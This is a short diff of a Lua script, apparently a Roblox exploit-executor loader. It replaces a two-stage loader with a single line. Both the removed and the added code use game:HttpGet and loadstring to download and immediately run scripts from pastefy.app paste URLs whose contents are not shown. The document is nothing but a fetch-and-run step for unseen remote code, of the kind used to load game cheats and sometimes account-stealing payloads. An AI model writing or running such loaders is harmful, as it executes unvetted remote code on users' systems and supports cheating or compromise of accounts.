@@ -1,16 +1,1 @@
--- Run first script normally
-loadstring(game:HttpGet("https://pastefy.app/YAiCtEd0/raw", true))()
-
-wait(2)
-
--- Create isolated environment for second script
-local secondScript = game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw", true)
-local func = loadstring(secondScript)
-
-if func then
-    -- Run in separate environment
-    setfenv(func, {})
-    func()
-else
-    warn("Second script failed to compile")
-end
+loadstring(game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw"))()
